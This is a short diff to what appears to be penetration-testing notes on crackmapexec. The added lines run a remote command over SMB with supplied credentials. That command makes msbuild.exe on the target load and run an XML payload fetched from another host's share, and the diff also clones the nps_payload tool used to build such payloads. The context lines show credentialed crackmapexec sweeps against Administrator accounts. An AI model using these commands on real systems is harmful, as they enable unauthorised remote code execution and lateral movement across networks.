@@ -8,6 +8,10 @@ crackmapexec X.X.X.X -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP --lusers --
 
 crackmapexec ip_new.txt -t 100 -u Administrator -p 'XXXXXX' -d WORKGROUP
 
+crackmapexec smb 192.168.137.1 -u username -p password -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml'
+
+git clone https://github.com/trustedsec/nps_payload.git
+
 === NEW ===
 SMB
 ----
